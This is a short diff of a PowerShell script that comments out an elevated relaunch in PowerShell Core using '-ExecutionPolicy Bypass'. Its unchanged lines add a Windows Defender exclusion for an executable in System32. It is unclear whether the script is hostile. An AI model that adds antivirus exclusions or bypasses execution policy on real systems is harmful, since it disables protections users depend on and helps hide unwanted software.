@@ -11,10 +11,10 @@ If (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]:
 }
 
 # Run Script In Powershell Core
-if ($PSEdition -eq "Desktop") {
-    Start-Process pwsh.exe "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
-    Exit
-}
+#if ($PSEdition -eq "Desktop") {
+#    Start-Process pwsh.exe "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
+#    Exit
+#}
 
 if (!(Get-MpPreference | Select-Object -ExpandProperty ExclusionPath) -eq "C:\Windows\System32\ZKTool.exe") {
     Add-MpPreference -ExclusionPath "$env:windir\System32\ZKTool.exe"
